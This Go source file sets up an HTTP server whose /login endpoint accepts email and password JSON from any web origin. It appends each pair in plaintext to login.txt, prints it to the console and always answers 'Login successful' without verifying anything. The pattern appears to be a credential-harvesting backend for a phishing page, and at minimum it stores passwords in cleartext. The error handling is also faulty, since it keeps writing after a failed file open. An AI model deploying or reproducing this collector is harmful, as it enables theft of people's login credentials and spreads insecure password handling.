package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"github.com/gorilla/mux"
)

type Details struct {
	Email    string `json:"email"`
	Password string `json:"password"`
}

func (details *Details) toString() string {
	return fmt.Sprintf("email=%s password=%s\n", details.Email, details.Password)
}

type Response struct {
	Message string `json:"message"`
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	formData := &Details{}
	response := &Response{}
	defer r.Body.Close()

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	if r.Method == "OPTIONS" {
		w.Header().Set("Access-Control-Allow-Headers", "Accept, Accept-Language, Content-Type")
        return
    }

	if err := json.NewDecoder(r.Body).Decode(formData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	fileName := "login.txt"
	f, err := os.OpenFile(fileName, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
        response.Message = "Unable to save login details!"
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Println(err.Error())
    }
    defer f.Close()

	if _, err = f.WriteString(formData.toString()); err != nil {
		response.Message = "Unable to save login details!"
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Println(err.Error())
    }
	
	fmt.Println(*formData)

	response.Message = "Login successful"
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response); err != nil {
		log.Printf("Can't encode %v - %s", w, err)
	}
}

func main() {
	myRouter := mux.NewRouter().StrictSlash(true)
	myRouter.HandleFunc("/login", loginHandler).Methods("POST", "OPTIONS")
	fmt.Println("server is running")
	log.Fatal(http.ListenAndServe(":8080", myRouter))
}
